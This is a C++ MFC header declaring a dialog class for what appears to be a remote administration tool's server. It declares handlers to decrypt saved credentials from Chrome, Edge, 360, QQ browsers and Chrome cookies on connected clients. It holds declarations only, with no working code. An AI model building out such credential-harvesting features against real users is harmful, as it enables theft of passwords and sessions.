#pragma once

#include "IOCPServer.h"
#include "Resource.h"

class DecryptDlg : public CDialogBase
{
    DECLARE_DYNAMIC(DecryptDlg)

public:
    DecryptDlg(CWnd* pParent = NULL, Server* IOCPServer = NULL, CONTEXT_OBJECT* ContextObject = NULL);
    virtual ~DecryptDlg();

    VOID OnReceiveComplete();

// 对话框数据
    enum { IDD = IDD_DIALOG_DECRYPT };

protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

    DECLARE_MESSAGE_MAP()
public:
    virtual BOOL OnInitDialog();
    afx_msg void OnClose();
    afx_msg void OnSize(UINT nType, int cx, int cy);
    afx_msg void OnDecryptChrome();
    afx_msg void OnDecryptEdge();
    afx_msg void OnDecryptSpeed360();
    afx_msg void OnDecrypt360();
    afx_msg void OnDecryptQQ();
    afx_msg void OnDecryptChromeCookies();
    CEdit m_EditDecrypedResult;
};
